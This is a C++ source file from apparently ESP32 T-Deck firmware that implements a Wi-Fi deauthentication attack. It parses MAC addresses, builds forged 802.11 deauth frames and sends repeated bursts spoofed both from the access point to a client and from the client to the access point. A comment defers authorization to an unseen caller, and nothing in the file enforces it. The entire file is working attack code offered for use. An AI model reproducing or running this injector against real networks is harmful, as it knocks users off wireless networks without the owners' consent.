// firmware/tdeck-ui/src/kuma_rf.cpp - T-Deck own-radio deauth injection.
// Pure RF: no authorization logic here — the terminal caller authorizes first.
#include "kuma_rf.h"
#include <esp_wifi.h>

namespace kuma_rf {

bool parseMac(const String& s, uint8_t out[6]) {
  String t = s; t.trim();
  int vals[6];
  // accept colon or dash separators
  if (sscanf(t.c_str(), "%x:%x:%x:%x:%x:%x",
             &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]) != 6 &&
      sscanf(t.c_str(), "%x-%x-%x-%x-%x-%x",
             &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]) != 6)
    return false;
  for (int i = 0; i < 6; ++i) {
    if (vals[i] < 0 || vals[i] > 0xff) return false;
    out[i] = (uint8_t)vals[i];
  }
  return true;
}

// 802.11 deauth frame template (reason 7 = class-3 frame from nonassociated STA).
// [0..1] frame control (0xC0 = deauth), [2..3] duration, [4..9] addr1=dst,
// [10..15] addr2=src, [16..21] addr3=bssid, [22..23] seq, [24..25] reason.
static uint8_t TMPL[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0,0,0,0,0,0,  0,0,0,0,0,0,  0,0,0,0,0,0,
  0x00, 0x00, 0x07, 0x00,
};

static void fill(uint8_t* f, const uint8_t dst[6], const uint8_t src[6],
                 const uint8_t bssid[6]) {
  memcpy(f, TMPL, sizeof TMPL);
  memcpy(f + 4, dst, 6);
  memcpy(f + 10, src, 6);
  memcpy(f + 16, bssid, 6);
}

int deauth(const uint8_t bssid[6], const uint8_t client[6], uint8_t channel,
           int bursts) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t ap2cl[26], cl2ap[26];
  fill(ap2cl, client, bssid, bssid);   // AP -> client
  fill(cl2ap, bssid, client, bssid);   // client -> AP
  int sent = 0;
  for (int i = 0; i < bursts; ++i) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, ap2cl, sizeof ap2cl, false) == ESP_OK) sent++;
    if (esp_wifi_80211_tx(WIFI_IF_STA, cl2ap, sizeof cl2ap, false) == ESP_OK) sent++;
    delay(2);
  }
  return sent;
}

}  // namespace kuma_rf
